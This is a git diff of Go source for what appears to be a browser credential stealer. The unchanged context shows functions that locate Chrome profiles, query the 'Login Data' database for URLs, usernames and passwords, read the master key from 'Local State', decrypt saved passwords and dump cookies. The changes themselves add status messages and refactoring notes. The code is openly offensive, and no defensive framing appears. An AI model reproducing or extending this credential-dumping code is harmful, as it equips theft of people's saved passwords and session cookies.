@@ -22,6 +22,7 @@ type Chrome struct {
 }
 
 func NewChrome() (Chrome, error) {
+	fmt.Print("[+] Initializing Chrome\n")
 	name := "chrome"
 	homeDir, _ := os.UserHomeDir()
 	basePath, err := getChromiumBasePath(name)
@@ -45,7 +46,10 @@ func NewChrome() (Chrome, error) {
 }
 
 // Extract login credentials from Chrome "Login Data" file
+// TODO: refactor, only thing that changes is basePath
 func (c Chrome) DumpCredentials() ([][]Credentials, error) {
+	fmt.Print("[+] Dumping Chrome Credentials\n")
+
 	dump := make([][]Credentials, len(c.profilePaths))
 	for _, profile := range c.profilePaths {
 		credentials, err := getChromeCredentials(fmt.Sprintf("%s\\%s", profile, "Login Data"))
@@ -88,6 +92,7 @@ func (c Chrome) DumpCookies() ([][]http.Cookie, error) {
 	return dump, nil
 }
 
+// TODO: refactor, is the same for brave
 func (c Chrome) DecryptPassword(psw *[]byte) {
 	password := *psw
 	iv := password[3:15]
@@ -134,6 +139,7 @@ func getChromeProfiles(basePath string) ([]string, error) {
 	}
 }
 
+// TODO: refactor, is the same for brave
 func getChromeDecryptionKey(basePath string) ([]byte, error) {
 	stateFile, err := os.ReadFile(fmt.Sprintf("%s\\%s", basePath, "Local State"))
 	if err != nil {
@@ -162,6 +168,7 @@ func getChromeDecryptionKey(basePath string) ([]byte, error) {
 	return key, nil
 }
 
+// TODO: refactor, is the same for brave
 func getChromeCredentials(path string) ([]Credentials, error) {
 	credentials := make([]Credentials, 0)
 	db, err := sql.Open("sqlite3", path)
@@ -173,7 +180,7 @@ func getChromeCredentials(path string) ([]Credentials, error) {
 	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
 	rows, err := db.Query(selectStatement)
 	if err != nil {
-		return credentials, err
+		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "[!] Chrome Running", err.Error()))
 	}
 
 	defer rows.Close()
